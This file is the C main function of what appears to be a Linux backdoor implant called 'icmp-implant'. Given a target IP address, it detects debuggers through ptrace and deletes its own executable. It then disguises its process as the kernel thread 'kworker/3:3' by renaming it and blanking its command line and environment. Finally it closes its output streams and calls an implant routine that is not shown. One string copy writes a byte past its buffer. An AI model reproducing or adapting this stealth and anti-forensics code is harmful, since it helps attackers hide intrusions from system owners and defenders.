#include "../include/implant.h"
#include <sys/ptrace.h>

int main(int argc, char **argv, char **envp) {
    if (argc < 2) {
        fprintf(stderr, "Usage: ./icmp-implant [IP-ADDRESS]\n");
        return 1;
    }

    const void *empty = NULL;
    size_t ip_len = strlen(argv[1]);
    char target[ip_len];

    // detect if a debugger is used against our implant
    if (ptrace(PTRACE_TRACEME, 0, 1, 0) < 0) {
        return 1;
    }

    strncpy(target, argv[1], ip_len);

    // remove implant upon execution
    unlink(argv[0]);

    // detach from tty to impersonate a daemon
    ioctl(0, TIOCNOTTY);

    // save the arg for later
    strncpy(target, argv[1], ip_len + 1);

    // process masquerading, change the command name associated with the process
    // empty out /proc/<PID>/cmdline
    prctl(PR_SET_MM, PR_SET_MM_ARG_START, &empty, NULL, NULL);
    prctl(PR_SET_MM, PR_SET_MM_ARG_END, &empty, NULL, NULL);

    // no brackets there just like kernel threads do
    prctl(PR_SET_NAME, "kworker/3:3", NULL, NULL, NULL); // modifies /proc/<PID>/status

    // kworker thread doesn't have any env variables
    prctl(PR_SET_MM, PR_SET_MM_ENV_START, &empty, NULL, NULL);
    prctl(PR_SET_MM, PR_SET_MM_ENV_END, &empty, NULL, NULL);

    close(STDIN_FILENO);
	close(STDOUT_FILENO);
    close(STDERR_FILENO);

    implant_init_n_call(target);
    return 0;
}